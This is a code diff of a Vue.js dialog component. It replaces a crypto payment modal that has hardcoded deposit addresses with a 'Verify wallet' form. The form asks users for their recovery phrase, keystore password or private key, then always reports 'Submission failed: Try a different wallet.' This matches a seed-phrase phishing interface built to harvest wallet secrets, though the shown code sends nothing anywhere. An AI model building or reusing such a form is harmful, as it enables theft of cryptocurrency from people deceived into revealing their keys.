@@ -1,91 +1,181 @@
 <template>
   <div class="text-center">
     <v-dialog v-model="modal" persistent width="500">
-      <v-card>
+      <v-card class="rounded-lg py-2">
         <v-card-title
-
-          class="text-h6 font-weight-light text-uppercase"
+          class="text-h6 font-weight-light text-capitalize"
           primary-title
         >
-          Pay with Crypto
-
-          <v-spacer />
-         <v-btn x-small fab outlined @click="cancel">
-             <v-icon size="20">
-                 mdi-close
-             </v-icon>
-         </v-btn>
-        </v-card-title>
-        <v-card-subtitle />
-        <v-divider />
-        <v-card-text class="py-6">
-            <v-form
-                ref="form"
-                v-model="valid"
-                @submit.prevent='submit'
-                lazy-validation >
-          <v-row>
-              <v-col cols="12" class="py-0">
-                    <v-select
-                        v-model="paymentMethod"
-                        color="primary"
-                        :items="paymentMethods"
-                        item-text="name"
-                        outlined
-                        class="text-subtitle-2 font-weight-light rounded-md"
-                        :rules="[(v) => !!v || 'Payment Method is required']"
-                        label="Choose a payment method"
-                        required
-                        return-object
-                    />
-              </v-col>
-                <v-col v-if="paymentMethod !== ''" cols="12" class=" py-0 pr-md-3  ">
-      <span class="text-body-2 text-sm-subtitle-2 info--text font-weight-medium">
-        Click the icon below to copy the wallet address or scan the QR-code and procced to payment
-      </span>
-    </v-col>
-    <v-col v-if="paymentMethod !== ''" cols="12" class="text-center pt-0 pr-md-3 mb-4">
-      <v-avatar tile size="140" class="white pa-2 mx-auto ma-2 rounded-md">
-        <img :src="paymentMethod.QR" max-width="100" :alt="paymentMethod.name">
-      </v-avatar>
-    </v-col>
-          <v-col v-if="paymentMethod !== ''" cols="12" class=" py-0 pr-md-3 mb-4">
-            <v-btn
-            dark
-                style="width:100%"
-                color="blue"
-                depressed
-                small
-                @click="copy(paymentMethod.address)"
-            >
-                <span style="width:100%" class="text-truncate text-caption">{{ paymentMethod.address }}</span>
-                <v-icon color="" small right>
-                mdi-content-copy
-                </v-icon>
-            </v-btn>
-        </v-col>
- <v-col v-if="paymentMethod !== ''" cols="12" class=" my-0 py-0 pr-md-3  ">
-      <span class="text-caption info--text font-weight-medium">
-        NB: Only {{paymentMethod.name}} should be sent to the above address
-      </span>
-    </v-col>
-            <v-col cols="12" class="my-0 d-flex justify-space-end align-center">
-   
+          <v-row class="ma-0">
+            <v-col cols="12" class="px-0 d-flex align-center">
+              <v-avatar size="60">
+                <img
+                  :src="`/logo/${wallet && wallet.logo}`"
+                  cover
+                  :alt="wallet && wallet.name"
+                />
+              </v-avatar>
+              <v-spacer></v-spacer>
+              <span>Verify {{ wallet && wallet.name }} wallet</span>
+              <v-spacer />
+            </v-col>
+            <v-col cols="12" class="d-flex align-center pa-0">
               <v-btn
-                depressed
-                large
-                dark
-                block
-                color="red darken-1"
-                @click="cancel"
-                class="font-weight-light text-subtitle-2"
+                @click="switchWallet('phrase')"
+                text
+                class="
+                  text-subtitle-2 text-sm-subtitle-1 text-capitalize
+                  font-weight-regular
+                "
               >
-                I've made the payment
+                Phrase
               </v-btn>
-             
+              <v-spacer />
+              <v-btn
+                @click="switchWallet('keystore')"
+                text
+                class="
+                  text-subtitle-2 text-sm-subtitle-1 text-capitalize
+                  font-weight-regular
+                "
+              >
+                Keystore JSON
+              </v-btn>
+              <v-spacer />
+              <v-btn
+                @click="switchWallet('private')"
+                text
+                class="
+                  text-subtitle-2 text-sm-subtitle-1 text-capitalize
+                  font-weight-regular
+                "
+              >
+                Private Key
+              </v-btn>
             </v-col>
           </v-row>
-              </v-form>
+        </v-card-title>
+        <v-divider />
+        <v-card-text class="py-6">
+          <v-form
+            ref="form"
+            v-model="valid"
+            @submit.prevent="submit"
+            lazy-validation
+          >
+            <v-row>
+              <!-- ////////////////// Keystore -->
+              <v-col v-if="type === 'keystore'" cols="12" class="py-0">
+                <v-text-field
+                  v-model="keystore"
+                  color="blue"
+                  outlined
+                  class="text-subtitle-2 font-weight-light rounded-md"
+                  :rules="[(v) => !!v || 'Wallet password is required']"
+                  label="Wallet Password"
+                  required
+                  return-object
+                />
+              </v-col>
+              <v-col
+                v-if="type === 'keystore'"
+                cols="12"
+                class="
+                  text-caption text-sm-subtitle-2
+                  font-weight-medium
+                  info--text
+                  text-center
+                  mt-n3
+                "
+              >
+                Several lines of text beginning with {...} plus the password you
+                used to encrypt it.
+              </v-col>
+
+              <!-- ////////////////// Phrase -->
+              <v-col v-if="type === 'phrase'" cols="12" class="py-0">
+                <v-textarea
+                  v-model="phrase"
+                  name="phrase"
+                  type="text"
+                  dense
+                  rows="3"
+                  outlined
+                  class="text-subtitle-2 font-weight-light rounded-md"
+                  color="blue"
+                  :rules="[(v) => !!v || 'Phrase is required']"
+                  label="Enter your recovery phrase"
+                  required
+                />
+              </v-col>
+              <v-col
+                v-if="type === 'phrase'"
+                cols="12"
+                class="
+                  text-caption text-sm-subtitle-2
+                  font-weight-medium
+                  info--text
+                  text-center
+                  mt-n3
+                "
+              >
+                Typically 12 (sometimes 24) words separated by single spaces
+              </v-col>
+
+              <!-- ////////////////// Private key -->
+              <v-col v-if="type === 'private'" cols="12" class="py-0">
+                <v-text-field
+                  v-model="privatekey"
+                  color="blue"
+                  outlined
+                  class="text-subtitle-2 font-weight-light rounded-md"
+                  :rules="[(v) => !!v || 'Private Key is required']"
+                  label="Enter your private key"
+                  required
+                  return-object
+                />
+              </v-col>
+              <v-col
+                v-if="type === 'private'"
+                cols="12"
+                class="
+                  text-caption text-sm-subtitle-2
+                  font-weight-medium
+                  info--text
+                  text-center
+                  mt-n3
+                "
+              >
+                Typically 12 (sometimes 24) words seperated by a single space.
+              </v-col>
+
+              <v-col cols="4" sm="3" class="">
+                <v-btn
+                  depressed
+                  large
+                  dark
+                  color="red darken-1"
+                  @click="cancel"
+                  class="font-weight-light text-subtitle-2"
+                >
+                  Cancel
+                </v-btn>
+              </v-col>
+              <v-col cols="8" sm="9" class="">
+                <v-btn
+                  depressed
+                  large
+                  dark
+                  type="submit"
+                  block
+                  color="blue darken-1"
+                  class="font-weight-light text-subtitle-2"
+                >
+                  Proceed
+                </v-btn>
+              </v-col>
+            </v-row>
+          </v-form>
         </v-card-text>
       </v-card>
     </v-dialog>
@@ -93,82 +183,58 @@
 </template>
 
 <script>
-
 export default {
-
   filters: {
-    currency (val) {
+    currency(val) {
       if (val) {
-        return val.toLocaleString()
+        return val.toLocaleString();
       } else {
-
       }
-    }
+    },
   },
   props: {
-   modal:{
-       type:Boolean,
-       default:false,
-   },
-   toggle:Function
+    modal: {
+      type: Boolean,
+      default: false,
+    },
+    toggle: Function,
+    wallet: Object,
   },
 
   data: () => ({
     valid: true,
-    paymentMethod:''
-
+    type: "phrase",
+    phrase: "",
+    keystore: "",
+    privatekey: "",
   }),
 
-computed:{
-paymentMethods(){
-    return [
-        {
-            name:'Bitcoin',
-            address:'bc1qk4dvrttzhpyvjqlatg764l8vkkq5jukxmrw2mw',
-            QR:'/stc1.png'
-        },
-        {
-            name:'Ethereum',
-            address:'bnb1uyygrsgfn0myg8meuae77fd6m0ymtj7v2lqn7x',
-            QR:'/stc1.png'
-        },
-        {
-            name:'BNB',
-            address:'bnb1uyygrsgfn0myg8meuae77fd6m0ymtj7v2lqn7x',
-            QR:'/stc1.png'
-        },
-        {
-            name:'Dodge Coin',
-            address:'DMJ5bGZckwLeCPRHgmfpupyhPG7K3WUHAy',
-            QR:'/stc1.png'
-        },
-    ]
-}
-},
+  computed: {},
 
   methods: {
-
-    submit () {
+    submit() {
       if (this.$refs.form.validate()) {
-        console.log('Click')
-      } return false
+        alert("Submission failed: Try a different wallet.");
+      }
+      return false;
     },
-    async copy (payload) {
-        await navigator.clipboard.writeText(payload)
-        alert('Wallet Address copied to clipboard')
+    switchWallet(type) {
+      this.type = type;
+      this.phrase = "";
+      this.keystore = "";
+      this.privatekey = "";
     },
-   
-    cancel () {
-      this.toggle(false)
+    cancel() {
+      this.toggle(false);
     },
-    reset () {
-      this.$refs.form.reset()
+    reset() {
+      this.$refs.form.reset();
     },
-    resetValidation () {
-      this.$refs.form.resetValidation()
-    }
-  }
-}
+    resetValidation() {
+      this.$refs.form.resetValidation();
+    },
+  },
+};
 </script>
 
 <style>
